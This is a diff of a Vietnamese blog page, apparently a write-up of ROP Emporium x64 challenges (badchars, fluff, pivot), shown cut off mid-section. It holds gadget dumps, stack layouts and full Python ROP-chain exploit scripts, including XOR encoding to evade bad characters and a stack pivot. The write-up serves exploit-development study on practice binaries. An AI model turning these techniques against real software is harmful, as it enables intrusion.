@@ -13,425 +13,425 @@
 </span><span class=separator>•</span>
 <span class=tag><a href=/tags/x64/>x64</a></span></div></div></header><div class=post-content><h2 id=bad-chars>Bad chars
 <a class=heading-link href=#bad-chars><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>Challenge 5 cũng tương tự challenge 4 write4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb</p><p><figure><img src=images/Bad%20chars/image.png alt></figure></p><p>Như vậy ta cần tránh 4 ký tự là “x”, “g”, “a”, “.”</p><p>Và để tránh truyền các ký tự này ta sẽ truyền vào string “flag.txt” đã được encrypt từng byte bằng phép xor với 0x50 (chọn key để tránh các kí tự trên) và sử dụng gadget xor để decrypt trước khi thực thi</p><p>Tiến hành lấy địa chỉ các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> $ rabin2 -i badchars
-</span></span><span style=display:flex><span>[Imports]
-</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>4   0x00400510 GLOBAL FUNC       print_file
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ rabin2 -S badchars
-</span></span><span style=display:flex><span>[Sections]
-</span></span><span style=display:flex><span>nth paddr        size vaddr       vsize perm name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>23  0x00001028   0x10 0x00601028   0x10 -rw- .data
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ python3 Ropper.py -f badchars
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;  
-</span></span><span style=display:flex><span>0x00000000004006a3: pop rdi; ret;
-</span></span><span style=display:flex><span>0x00000000004004ee: ret;
-</span></span><span style=display:flex><span>0x0000000000400628: xor byte ptr [r15], r14b; ret;
-</span></span><span style=display:flex><span>0x0000000000400634: mov qword ptr [r13], r12; ret;
-</span></span><span style=display:flex><span>0x00000000004006a2: pop r15; ret; 
-</span></span></code></pre></div><p>Build stack như sau</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>---&gt; Load encrypted flag vào section .data
-</span></span><span style=display:flex><span>[A*8  ]
-</span></span><span style=display:flex><span>[.....]
-</span></span><span style=display:flex><span>[A*8  ] -&gt; 40*A
-</span></span><span style=display:flex><span>[0x40069c] -&gt; pop r12; pop r13; pop r14; pop r15; ret;
-</span></span><span style=display:flex><span>[encrypted_flag] -&gt; 8 byte encrypted &#34;flag.txt&#34; -&gt; r12
-</span></span><span style=display:flex><span>[0x601028 + 7] -&gt; -rw- .data -&gt; r13; Vì 0x601028 + 0x6 = 0x60102e có 0x2e là &#39;.&#39; nên ta cộng thêm 7 vào địa chỉ
-</span></span><span style=display:flex><span>[key] -&gt; encrypt key -&gt; r14
-</span></span><span style=display:flex><span>[0x601028] -&gt; -rw- .data -&gt; r15
-</span></span><span style=display:flex><span>[0x400634] -&gt; mov qword ptr [r13], r12; ret;  -&gt; lấy encrypted &#39;flag.txt&#39; (r12) lưu vào .data (r13)
-</span></span><span style=display:flex><span>---&gt; Lặp lại gadget xor với mỗi byte trong encrypted flag lưu tại .data
-</span></span><span style=display:flex><span>[0x400628] -&gt; xor byte ptr [r15], r14b; ret;
-</span></span><span style=display:flex><span>[0x4006a2] -&gt; pop r15; ret;
-</span></span><span style=display:flex><span>[0x601028 + 7 + i] -&gt; Với  1&lt;= i &lt; 8
-</span></span><span style=display:flex><span>[0x400628] -&gt; xor byte ptr [r15], r14b; ret; byte cuối của encrypted flag
-</span></span><span style=display:flex><span>[0x4006a3] -&gt; pop rdi; ret;
-</span></span><span style=display:flex><span>[0x601028 + 7] -&gt; rdi -&gt; arg1 của print_file
-</span></span><span style=display:flex><span>[0x4004ee] -&gt; ret;
-</span></span><span style=display:flex><span>[0x400510] -&gt; print_file();
-</span></span></code></pre></div><p>Dựa trên stack như trên ta build payload sử dụng python và struct module</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>from struct import pack
-</span></span><span style=display:flex><span>import sys
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-weight:700>def</span> p(x):
-</span></span><span style=display:flex><span>    <span style=font-weight:700>return</span> pack(<span style=font-style:italic>&#39;&lt;Q&#39;</span>, x)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>data_loc_addr = 0x601028 + 7 <span style=font-style:italic># because 0x601028 + 0x6 = 0x60102e and 0x2e is &#39;.&#39; in badchars</span>
-</span></span><span style=display:flex><span>key = 0x50
-</span></span><span style=display:flex><span>filename = <span style=font-style:italic>&#39;flag.txt&#39;</span>
-</span></span><span style=display:flex><span>enc_filename = <span style=font-style:italic>&#39;&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-weight:700>for</span> c <span style=font-weight:700>in</span> filename:
-</span></span><span style=display:flex><span>    enc_filename += chr(ord(c) ^ key)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;&#39;</span>
-</span></span><span style=display:flex><span>payload += <span style=font-style:italic>b</span><span style=font-style:italic>&#39;B&#39;</span>*40
-</span></span><span style=display:flex><span>payload += p(0x40069c) <span style=font-style:italic># pop r12; pop r13; pop r14; pop r15; ret; </span>
-</span></span><span style=display:flex><span>payload += enc_filename.encode() <span style=font-style:italic># r12</span>
-</span></span><span style=display:flex><span>payload += p(data_loc_addr) <span style=font-style:italic># r13</span>
-</span></span><span style=display:flex><span>payload += p(key) <span style=font-style:italic># r14</span>
-</span></span><span style=display:flex><span>payload += p(data_loc_addr) <span style=font-style:italic># r15</span>
-</span></span><span style=display:flex><span>payload += p(0x400634) <span style=font-style:italic># mov qword ptr [r13], r12; ret;</span>
-</span></span><span style=display:flex><span><span style=font-weight:700>for</span> i <span style=font-weight:700>in</span> range(1,8):
-</span></span><span style=display:flex><span>    payload += p(0x400628) <span style=font-style:italic># xor byte ptr [r15], r14b; ret;</span>
-</span></span><span style=display:flex><span>    payload += p(0x4006a2) <span style=font-style:italic># pop r15; ret;</span>
-</span></span><span style=display:flex><span>    payload += p(data_loc_addr + i)
-</span></span><span style=display:flex><span>payload += p(0x400628) <span style=font-style:italic># xor byte ptr [r15], r14b; ret;</span>
-</span></span><span style=display:flex><span>payload += p(0x4006a3) <span style=font-style:italic># pop rdi; ret;</span>
-</span></span><span style=display:flex><span>payload += p(data_loc_addr)
-</span></span><span style=display:flex><span>payload += p(0x4004ee) <span style=font-style:italic># ret;</span>
-</span></span><span style=display:flex><span>payload += p(0x400510) <span style=font-style:italic># print_file</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sys.stdout.buffer.write(payload)
-</span></span></code></pre></div><h2 id=fluff>Fluff
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 5 cũng tương tự challenge 4 write4 nhưng chuỗi khi truyền vào sẽ được kiểm tra các ký tự, nếu gặp các ký tự này sẽ bị thay thế bằng 0xeb</p><p><figure><img src=images/Bad%20chars/image.png alt></figure></p><p>Như vậy ta cần tránh 4 ký tự là “x”, “g”, “a”, “.”</p><p>Và để tránh truyền các ký tự này ta sẽ truyền vào string “flag.txt” đã được encrypt từng byte bằng phép xor với 0x50 (chọn key để tránh các kí tự trên) và sử dụng gadget xor để decrypt trước khi thực thi</p><p>Tiến hành lấy địa chỉ các gadget cần thiết</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain> $ rabin2 -i badchars
+[Imports]
+nth vaddr      bind   type   lib name
+―――――――――――――――――――――――――――――――――――――
+...
+4   0x00400510 GLOBAL FUNC       print_file
+
+$ rabin2 -S badchars
+[Sections]
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+
+$ python3 Ropper.py -f badchars
+...
+0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;  
+0x00000000004006a3: pop rdi; ret;
+0x00000000004004ee: ret;
+0x0000000000400628: xor byte ptr [r15], r14b; ret;
+0x0000000000400634: mov qword ptr [r13], r12; ret;
+0x00000000004006a2: pop r15; ret; 
+</code></pre><p>Build stack như sau</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>---&gt; Load encrypted flag vào section .data
+[A*8  ]
+[.....]
+[A*8  ] -&gt; 40*A
+[0x40069c] -&gt; pop r12; pop r13; pop r14; pop r15; ret;
+[encrypted_flag] -&gt; 8 byte encrypted &#34;flag.txt&#34; -&gt; r12
+[0x601028 + 7] -&gt; -rw- .data -&gt; r13; Vì 0x601028 + 0x6 = 0x60102e có 0x2e là &#39;.&#39; nên ta cộng thêm 7 vào địa chỉ
+[key] -&gt; encrypt key -&gt; r14
+[0x601028] -&gt; -rw- .data -&gt; r15
+[0x400634] -&gt; mov qword ptr [r13], r12; ret;  -&gt; lấy encrypted &#39;flag.txt&#39; (r12) lưu vào .data (r13)
+---&gt; Lặp lại gadget xor với mỗi byte trong encrypted flag lưu tại .data
+[0x400628] -&gt; xor byte ptr [r15], r14b; ret;
+[0x4006a2] -&gt; pop r15; ret;
+[0x601028 + 7 + i] -&gt; Với  1&lt;= i &lt; 8
+[0x400628] -&gt; xor byte ptr [r15], r14b; ret; byte cuối của encrypted flag
+[0x4006a3] -&gt; pop rdi; ret;
+[0x601028 + 7] -&gt; rdi -&gt; arg1 của print_file
+[0x4004ee] -&gt; ret;
+[0x400510] -&gt; print_file();
+</code></pre><p>Dựa trên stack như trên ta build payload sử dụng python và struct module</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>from struct import pack
+import sys
+
+def p(x):
+    return pack(&#39;&lt;Q&#39;, x)
+
+data_loc_addr = 0x601028 + 7 # because 0x601028 + 0x6 = 0x60102e and 0x2e is &#39;.&#39; in badchars
+key = 0x50
+filename = &#39;flag.txt&#39;
+enc_filename = &#39;&#39;
+
+for c in filename:
+    enc_filename += chr(ord(c) ^ key)
+
+payload = b&#39;&#39;
+payload += b&#39;B&#39;*40
+payload += p(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret; 
+payload += enc_filename.encode() # r12
+payload += p(data_loc_addr) # r13
+payload += p(key) # r14
+payload += p(data_loc_addr) # r15
+payload += p(0x400634) # mov qword ptr [r13], r12; ret;
+for i in range(1,8):
+    payload += p(0x400628) # xor byte ptr [r15], r14b; ret;
+    payload += p(0x4006a2) # pop r15; ret;
+    payload += p(data_loc_addr + i)
+payload += p(0x400628) # xor byte ptr [r15], r14b; ret;
+payload += p(0x4006a3) # pop rdi; ret;
+payload += p(data_loc_addr)
+payload += p(0x4004ee) # ret;
+payload += p(0x400510) # print_file
+
+sys.stdout.buffer.write(payload)
+</code></pre><h2 id=fluff>Fluff
 <a class=heading-link href=#fluff><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>Challenge 6 tương tự challenge 4 write4 nhưng ta sẽ dùng các gadget mới hơn để xây dựng ROP chain</p><p>Tiến hành lấy các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> $ rabin2 -i fluff
-</span></span><span style=display:flex><span>[Imports]
-</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>4   0x00400510 GLOBAL FUNC       print_file
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ rabin2 -S fluff
-</span></span><span style=display:flex><span>[Sections]
-</span></span><span style=display:flex><span>nth paddr        size vaddr       vsize perm name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>23  0x00001028   0x10 0x00601028   0x10 -rw- .data
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ python3 Ropper.py -f badchars
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
-</span></span><span style=display:flex><span>0x0000000000400639: stosb byte ptr [rdi], al; ret; 
-</span></span><span style=display:flex><span>0x0000000000400628: xlatb; ret;
-</span></span><span style=display:flex><span>0x00000000004006a3: pop rdi; ret;
-</span></span><span style=display:flex><span>0x0000000000400295: ret;
-</span></span></code></pre></div><p>Ở đây ta thiếu các gadget như challenge 4 để truyền string “flag.txt” vào .data section.</p><p>Ta dùng gadget <code>stosb byte ptr [rdi], al; ret;</code> để truyền giá trị thanh ghi <code>al</code> vào <code>[rdi]</code> với rdi là địa chỉ section .data được control bằng gadget  <code>pop rdi; ret;</code>. Lưu ý rdi sẽ tự add 0x1 vào mỗi lần thực thi gadget này</p><p>Để control thanh ghi <code>al</code> ta sử dụng gadget <code>xlatb; ret;</code> xlatb sẽ tương đương gán <code>al = rbx + al</code>. Do đó khi control được <code>rbx</code> ta sẽ  điều chỉnh được thanh ghi <code>al</code> <a href=https://www.felixcloutier.com/x86/xlat:xlatb>https://www.felixcloutier.com/x86/xlat:xlatb</a></p><p>Để control rbx ta sẽ dùng gadget <code>pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;</code>, với instruction <code>bextr rbx, rcx, rdx; ret;</code> sẽ trích xuất các bit liên tục từ start <code>rcx</code> với length <code>rdx</code> (rcx lấy bit từ 0:7, rdx lấy bit từ 8:15)</p><p>Ta xây dựng stack như sau</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[A*8  ]
-</span></span><span style=display:flex><span>[.....]
-</span></span><span style=display:flex><span>[A*8  ] -&gt; 40*A
-</span></span><span style=display:flex><span>[0x4006a3] -&gt; pop rdi; ret;
-</span></span><span style=display:flex><span>[0x601028] -&gt; -rw- .data -&gt; control rdi cho gadget stosb
-</span></span><span style=display:flex><span>---&gt; Control al, lấy từng ký tự &#39;flag.txt&#39;
-</span></span><span style=display:flex><span>[0x40062a] -&gt; pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
-</span></span><span style=display:flex><span>[0x4000] -&gt; rdx -&gt; length bit [8:15] = 0x40 (8 bits = 1 byte)
-</span></span><span style=display:flex><span>[base + index - 0x3ef2 - current_al] -&gt; base + index là vị trí của từng ký tự &#39;flag.txt&#39; trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al := rbx + al và trừ đi 0x3ef2 do instruction &#39;add rcx, 0x3ef2&#39; khi đó al := giá trị tại vị trí của &#39;flag.txt&#39;
-</span></span><span style=display:flex><span>[0x400628] -&gt; xlatb; ret;
-</span></span><span style=display:flex><span>[0x400639] -&gt; stosb byte ptr [rdi], al; ret; 
-</span></span><span style=display:flex><span>----&gt; Sau khi lấy hết ký tự &#39;flag.txt&#39; vào rdi, ta truyền vào hàm print_file()
-</span></span><span style=display:flex><span>[0x4006a3] -&gt; pop rdi; ret;
-</span></span><span style=display:flex><span>[0x400295] -&gt; ret;
-</span></span><span style=display:flex><span>[0x400510] -&gt; print_file();
-</span></span></code></pre></div><p>Exploit code</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>from struct import pack
-</span></span><span style=display:flex><span>import sys
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>base = 0x400000
-</span></span><span style=display:flex><span>length = 0x4000 <span style=font-style:italic>#length bits, bit from  15:8 is 0x40 -&gt; 64 bit, 8 byte</span>
-</span></span><span style=display:flex><span>xlatb = 0x0000000000400628 <span style=font-style:italic># xlatb; ret;</span>
-</span></span><span style=display:flex><span>bextr = 0x000000000040062a <span style=font-style:italic># pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; </span>
-</span></span><span style=display:flex><span>stosb = 0x0000000000400639 <span style=font-style:italic># stosb byte ptr [rdi], al; ret;</span>
-</span></span><span style=display:flex><span>pop_rdi = 0x00000000004006a3 <span style=font-style:italic># pop rdi; ret;</span>
-</span></span><span style=display:flex><span>data_section_addrs = 0x00601028
-</span></span><span style=display:flex><span>print_file_addrs = 0x00400510 <span style=font-style:italic># 4   0x00400510 GLOBAL FUNC       print_file</span>
-</span></span><span style=display:flex><span>ret = 0x0000000000400295 <span style=font-style:italic># ret;</span>
-</span></span><span style=display:flex><span>current_rax = 0xb
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-weight:700>def</span> p(x):
-</span></span><span style=display:flex><span>    <span style=font-weight:700>return</span> pack(<span style=font-style:italic>&#34;&lt;Q&#34;</span>, x)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-weight:700>def</span> find_index(filename=<span style=font-style:italic>&#39;flag.txt&#39;</span>):
-</span></span><span style=display:flex><span>    indexes = []
-</span></span><span style=display:flex><span>    with open(<span style=font-style:italic>&#39;fluff&#39;</span>, <span style=font-style:italic>&#39;rb&#39;</span>) as f:
-</span></span><span style=display:flex><span>        buff = f.read()
-</span></span><span style=display:flex><span>        <span style=font-weight:700>for</span> c <span style=font-weight:700>in</span> filename:
-</span></span><span style=display:flex><span>            indexes.append(buff.index(bytes(c,<span style=font-style:italic>&#39;ascii&#39;</span>)))
-</span></span><span style=display:flex><span>    <span style=font-weight:700>return</span> indexes
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>filename = <span style=font-style:italic>&#39;flag.txt&#39;</span>
-</span></span><span style=display:flex><span>filename_index = find_index(filename=filename) <span style=font-style:italic># index of char in binary to create string &#39;flag.txt&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;&#39;</span>
-</span></span><span style=display:flex><span>payload += <span style=font-style:italic>b</span><span style=font-style:italic>&#39;A&#39;</span>*40
-</span></span><span style=display:flex><span>payload += p(pop_rdi)
-</span></span><span style=display:flex><span>payload += p(data_section_addrs)
-</span></span><span style=display:flex><span><span style=font-weight:700>for</span> i, index <span style=font-weight:700>in</span> enumerate(filename_index):
-</span></span><span style=display:flex><span>    payload += p(bextr)
-</span></span><span style=display:flex><span>    payload += p(length)
-</span></span><span style=display:flex><span>    payload += p(base + index - 0x3ef2 - current_rax)
-</span></span><span style=display:flex><span>    payload += p(xlatb)
-</span></span><span style=display:flex><span>    payload += p(stosb)
-</span></span><span style=display:flex><span>    current_rax = ord(filename[i])
-</span></span><span style=display:flex><span>payload += p(pop_rdi)
-</span></span><span style=display:flex><span>payload += p(data_section_addrs)
-</span></span><span style=display:flex><span>payload += p(ret)
-</span></span><span style=display:flex><span>payload += p(print_file_addrs)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sys.stdout.buffer.write(payload)
-</span></span></code></pre></div><h2 id=pivot>Pivot
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 6 tương tự challenge 4 write4 nhưng ta sẽ dùng các gadget mới hơn để xây dựng ROP chain</p><p>Tiến hành lấy các gadget cần thiết</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain> $ rabin2 -i fluff
+[Imports]
+nth vaddr      bind   type   lib name
+―――――――――――――――――――――――――――――――――――――
+...
+4   0x00400510 GLOBAL FUNC       print_file
+
+$ rabin2 -S fluff
+[Sections]
+nth paddr        size vaddr       vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+
+$ python3 Ropper.py -f badchars
+...
+0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
+0x0000000000400639: stosb byte ptr [rdi], al; ret; 
+0x0000000000400628: xlatb; ret;
+0x00000000004006a3: pop rdi; ret;
+0x0000000000400295: ret;
+</code></pre><p>Ở đây ta thiếu các gadget như challenge 4 để truyền string “flag.txt” vào .data section.</p><p>Ta dùng gadget <code>stosb byte ptr [rdi], al; ret;</code> để truyền giá trị thanh ghi <code>al</code> vào <code>[rdi]</code> với rdi là địa chỉ section .data được control bằng gadget  <code>pop rdi; ret;</code>. Lưu ý rdi sẽ tự add 0x1 vào mỗi lần thực thi gadget này</p><p>Để control thanh ghi <code>al</code> ta sử dụng gadget <code>xlatb; ret;</code> xlatb sẽ tương đương gán <code>al = rbx + al</code>. Do đó khi control được <code>rbx</code> ta sẽ  điều chỉnh được thanh ghi <code>al</code> <a href=https://www.felixcloutier.com/x86/xlat:xlatb>https://www.felixcloutier.com/x86/xlat:xlatb</a></p><p>Để control rbx ta sẽ dùng gadget <code>pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;</code>, với instruction <code>bextr rbx, rcx, rdx; ret;</code> sẽ trích xuất các bit liên tục từ start <code>rcx</code> với length <code>rdx</code> (rcx lấy bit từ 0:7, rdx lấy bit từ 8:15)</p><p>Ta xây dựng stack như sau</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>[A*8  ]
+[.....]
+[A*8  ] -&gt; 40*A
+[0x4006a3] -&gt; pop rdi; ret;
+[0x601028] -&gt; -rw- .data -&gt; control rdi cho gadget stosb
+---&gt; Control al, lấy từng ký tự &#39;flag.txt&#39;
+[0x40062a] -&gt; pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
+[0x4000] -&gt; rdx -&gt; length bit [8:15] = 0x40 (8 bits = 1 byte)
+[base + index - 0x3ef2 - current_al] -&gt; base + index là vị trí của từng ký tự &#39;flag.txt&#39; trong binary, ta phải cộng thêm giá trị hiện tại của al vì xlatb sẽ là al := rbx + al và trừ đi 0x3ef2 do instruction &#39;add rcx, 0x3ef2&#39; khi đó al := giá trị tại vị trí của &#39;flag.txt&#39;
+[0x400628] -&gt; xlatb; ret;
+[0x400639] -&gt; stosb byte ptr [rdi], al; ret; 
+----&gt; Sau khi lấy hết ký tự &#39;flag.txt&#39; vào rdi, ta truyền vào hàm print_file()
+[0x4006a3] -&gt; pop rdi; ret;
+[0x400295] -&gt; ret;
+[0x400510] -&gt; print_file();
+</code></pre><p>Exploit code</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>from struct import pack
+import sys
+
+base = 0x400000
+length = 0x4000 #length bits, bit from  15:8 is 0x40 -&gt; 64 bit, 8 byte
+xlatb = 0x0000000000400628 # xlatb; ret;
+bextr = 0x000000000040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
+stosb = 0x0000000000400639 # stosb byte ptr [rdi], al; ret;
+pop_rdi = 0x00000000004006a3 # pop rdi; ret;
+data_section_addrs = 0x00601028
+print_file_addrs = 0x00400510 # 4   0x00400510 GLOBAL FUNC       print_file
+ret = 0x0000000000400295 # ret;
+current_rax = 0xb
+
+def p(x):
+    return pack(&#34;&lt;Q&#34;, x)
+
+def find_index(filename=&#39;flag.txt&#39;):
+    indexes = []
+    with open(&#39;fluff&#39;, &#39;rb&#39;) as f:
+        buff = f.read()
+        for c in filename:
+            indexes.append(buff.index(bytes(c,&#39;ascii&#39;)))
+    return indexes
+
+filename = &#39;flag.txt&#39;
+filename_index = find_index(filename=filename) # index of char in binary to create string &#39;flag.txt&#39;
+
+payload = b&#39;&#39;
+payload += b&#39;A&#39;*40
+payload += p(pop_rdi)
+payload += p(data_section_addrs)
+for i, index in enumerate(filename_index):
+    payload += p(bextr)
+    payload += p(length)
+    payload += p(base + index - 0x3ef2 - current_rax)
+    payload += p(xlatb)
+    payload += p(stosb)
+    current_rax = ord(filename[i])
+payload += p(pop_rdi)
+payload += p(data_section_addrs)
+payload += p(ret)
+payload += p(print_file_addrs)
+
+sys.stdout.buffer.write(payload)
+</code></pre><h2 id=pivot>Pivot
 <a class=heading-link href=#pivot><i class="fa fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h2><p>Challenge 7 ta sẽ bị giới hạn số lượng bytes có thể overflow do đó ta cần chuyển hướng rsp - stack pointer đến vị trí khác để có thể thực thi</p><p><figure><img src=images/Pivot/image.png alt></figure></p><p>Ở challenge này tác giả đã khởi tạo 0x10000000 bytes bộ nhớ và cho địa chỉ tại stdout, ta chỉ cần chuyển hướng stack pointer đến địa chỉ này và sử dụng. </p><p>Hàm memset sẽ chỉ cho phép 0x20 = 32 bytes trong bộ nhớ nên ta chỉ có thể overflow 32 bytes, vừa đủ để pivot stack.</p><p><figure><img src=images/Pivot/1_image.png alt></figure></p><p>Do giá trị trên sẽ thay đổi ở các lần thực thi (hàm malloc sẽ trả về giá trị khác nhau) và ta sẽ cần lấy giá trị đó để thay đổi giá trị trong payload trước khi truyền nên cần sử dụng thêm thư viện pwntools </p><p>Payload 2: Lấy địa chỉ đã cho và chuyển hướng rsp tới đó</p><p>Các gadget cần thiết</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ python3 Ropper.py -f pivot
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>0x00000000004009bb: pop rax; ret;
-</span></span><span style=display:flex><span>0x00000000004009bd: xchg rax, rsp; ret;
-</span></span></code></pre></div><p>Lấy input từ stdout và build stack</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>line1 = p.recvuntil(<span style=font-style:italic>b</span><span style=font-style:italic>&#39;&gt;&#39;</span>)
-</span></span><span style=display:flex><span>heap_addr = <span style=font-weight:700>int</span>(re.search(<span style=font-style:italic>&#39;pivot: (0x\w+)&#39;</span>, line1.decode()).group(1), 16)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload2 = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;A&#39;</span>*40
-</span></span><span style=display:flex><span>payload2 += p64(0x4009bb) <span style=font-style:italic>#0x00000000004009bb: pop rax; ret;</span>
-</span></span><span style=display:flex><span>payload2 += p64(heap_addr)
-</span></span><span style=display:flex><span>payload2 += p64(0x4009bd) <span style=font-style:italic># 0x00000000004009bd: xchg rax, rsp; ret;</span>
-</span></span><span style=display:flex><span>p.sendline(payload2)
-</span></span></code></pre></div><p>Payload 1: Build ROP chain sẽ thực thi sau khi chuyển hướng</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> $ rabin2 -i pivot
-</span></span><span style=display:flex><span>[Imports]
-</span></span><span style=display:flex><span>nth vaddr      bind   type   lib name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>2   0x004006e0 GLOBAL FUNC       puts
-</span></span><span style=display:flex><span>8   0x00400720 GLOBAL FUNC       foothold_function
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ rabin2 -S pivot
-</span></span><span style=display:flex><span>[Sections]
-</span></span><span style=display:flex><span>nth paddr        size vaddr       vsize perm name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>23  0x00001028   0x10 0x00601028   0x10 -rw- .data
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ rabin2 -is libpivot.so
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>[Symbols]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>nth paddr      vaddr      bind   type   size lib name
-</span></span><span style=display:flex><span>―――――――――――――――――――――――――――――――――――――――――――――――――――――
-</span></span><span style=display:flex><span>10  0x0000096a 0x0000096a GLOBAL FUNC   19       foothold_function
-</span></span><span style=display:flex><span>18  0x00000a81 0x00000a81 GLOBAL FUNC   146      ret2win
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ readelf -r pivot 
-</span></span><span style=display:flex><span>Relocation section &#39;.rela.plt&#39; at offset 0x5c8 contains 9 entries:
-</span></span><span style=display:flex><span>  Offset          Info           Type           Sym. Value    Sym. Name + Addend
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-</span></span><span style=display:flex><span>000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 foothold_function + 0
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ radare2 pivot
-</span></span><span style=display:flex><span>[0x00400760]&gt; aaa
-</span></span><span style=display:flex><span>[0x00400760]&gt; afl
-</span></span><span style=display:flex><span>[0x00400760]&gt; s sym.imp.foothold_function
-</span></span><span style=display:flex><span>[0x00400720]&gt; pdf
